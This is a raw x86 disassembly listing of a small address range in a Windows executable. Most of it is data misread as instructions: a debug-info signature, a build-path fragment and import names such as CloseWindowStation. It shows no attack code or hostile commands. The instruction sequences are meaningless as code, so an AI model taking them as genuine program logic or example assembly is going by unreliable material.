  413cc7:	add    al,ch
  413cc9:	cmp    al,0x41
  413ccb:	add    ah,ch
  413ccd:	cmp    al,0x41
  413ccf:	add    al,dh
  413cd1:	cmp    al,0x41
  413cd3:	add    ah,dh
  413cd5:	cmp    al,0x41
  413cd7:	add    BYTE PTR [ebp+0x16],ah
  413cda:	adc    BYTE PTR [eax],al
  413cdc:	sub    BYTE PTR [ecx+0x10],0x0
  413ce0:	cli    
  413ce1:	adc    BYTE PTR [bx+si],al
  413ce4:	sbb    BYTE PTR [ecx],al
  413ce6:	adc    BYTE PTR [eax],al
  413ce8:	pop    edi
  413ce9:	inc    esp
  413cea:	adc    BYTE PTR [eax],al
  413cec:	sbb    BYTE PTR [edx],ch
  413cee:	adc    BYTE PTR [eax],al
  413cf0:	in     eax,dx
  413cf1:	pop    ss
  413cf2:	adc    BYTE PTR [eax],al
  413cf4:	pop    esp
  413cf5:	sub    BYTE PTR [eax],dl
  413cf7:	add    BYTE PTR [esp+edi*1+0x41],ch
  413cfb:	add    BYTE PTR [eax+0x3c],dh
  413cfe:	inc    ecx
  413cff:	add    BYTE PTR [esp+edi*1+0x41],dh
  413d03:	add    BYTE PTR [eax+0x3c],bh
  413d06:	inc    ecx
  413d07:	add    BYTE PTR [esp+edi*1+0x41],bh
  413d0b:	add    BYTE PTR [eax-0x7bffbec4],al
  413d11:	cmp    al,0x41
  413d13:	add    BYTE PTR [eax-0x17ffbec4],cl
  413d19:	aaa    
  413d1a:	adc    BYTE PTR [eax],al
  413d1c:	cmp    DWORD PTR [esi],0x51e90010
  413d22:	adc    BYTE PTR [eax],al
  413d24:	push   cs
  413d25:	dec    eax
  413d26:	adc    BYTE PTR [eax],al
  413d28:	mov    ah,0x22
  413d2a:	adc    BYTE PTR [eax],al
  413d2c:	lock xor BYTE PTR [eax],dl
  413d2f:	add    BYTE PTR [edi+0x6b],ah
  413d32:	adc    BYTE PTR [eax],al
  413d34:	outs   dx,BYTE PTR ds:[esi]
  413d35:	or     eax,0x10
  413d3a:	add    BYTE PTR [eax],al
  413d3c:	add    BYTE PTR [eax],al
  413d3e:	add    BYTE PTR [eax],al
  413d40:	push   edx
  413d41:	push   ebx
  413d42:	inc    esp
  413d43:	push   ebx
  413d44:	dec    esi
  413d45:	or     DWORD PTR [ecx+edx*8],eax
  413d48:	or     ebp,esp
  413d4a:	push   eax
  413d4b:	dec    ecx
  413d4c:	(bad)
  413d50:	scas   eax,DWORD PTR es:[edi]
  413d51:	int    0x5c
  413d53:	call   0x413d59
  413d58:	inc    ebp
  413d59:	cmp    bl,BYTE PTR [ecx+ecx*2+0x6e]
  413d5d:	jae    0x413dd3
  413d5f:	popa   
  413d60:	ins    BYTE PTR es:[edi],dx
  413d61:	ins    BYTE PTR es:[edi],dx
  413d62:	and    BYTE PTR [eax+0x61],dl
  413d65:	je     0x413dcf
  413d67:	pop    esp
  413d68:	push   ebx
  413d69:	outs   dx,BYTE PTR gs:[esi]
  413d6b:	fs push ebx
  413d6d:	dec    ebp
  413d6e:	push   ebx
  413d6f:	pop    esp
  413d70:	dec    ebp
  413d71:	popa   
  413d72:	imul   ebp,DWORD PTR [esi+0x5c],0x46627553
  413d79:	outs   dx,DWORD PTR ds:[esi]
  413d7a:	ins    BYTE PTR es:[edi],dx
  413d7b:	fs gs jb 0x413ddb
  413d7f:	dec    ecx
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413d85:	gs jae 0x413de4
  413d88:	dec    ecx
  413d89:	outs   dx,BYTE PTR ds:[esi]
  413d8a:	outs   dx,WORD PTR ds:[esi]
  413d8c:	inc    ecx
  413d8d:	jo     0x413dff
  413d8f:	add    BYTE PTR [eax],al
  413d91:	add    BYTE PTR [eax],al
  413d93:	add    BYTE PTR [esi+0x4df185],bh
  413d99:	add    BYTE PTR [eax],al
  413d9b:	add    dl,al
  413d9d:	cmp    eax,0x10001
  413da2:	add    BYTE PTR [eax],al
  413da4:	add    DWORD PTR [eax],eax
  413da6:	add    BYTE PTR [eax],al
  413da8:	add    DWORD PTR [eax],eax
  413daa:	add    BYTE PTR [eax],al
  413dac:	mov    eax,0xbc00013d
  413db1:	cmp    eax,0x3dc00001
  413db6:	add    DWORD PTR [eax],eax
  413db8:	mov    ds:0xce000026,al
  413dbd:	cmp    eax,0x1
  413dc2:	push   ebx
  413dc3:	jns    0x413e32
  413dc5:	bound  ebp,QWORD PTR [edi+0x6c]
  413dc8:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  413dcf:	inc    ebx
  413dd0:	ins    BYTE PTR es:[edi],dx
  413dd1:	outs   dx,DWORD PTR ds:[esi]
  413dd2:	jae    0x413e39
  413dd4:	push   edi
  413dd5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  413ddc:	popa   
  413ddd:	je     0x413e48
  413ddf:	outs   dx,DWORD PTR ds:[esi]
  413de0:	outs   dx,BYTE PTR ds:[esi]
  413de1:	inc    ebx
  413de2:	ins    BYTE PTR es:[edi],dx
  413de3:	outs   dx,DWORD PTR ds:[esi]
  413de4:	jae    0x413e4b
  413de6:	push   edi
  413de7:	.byte 0x69
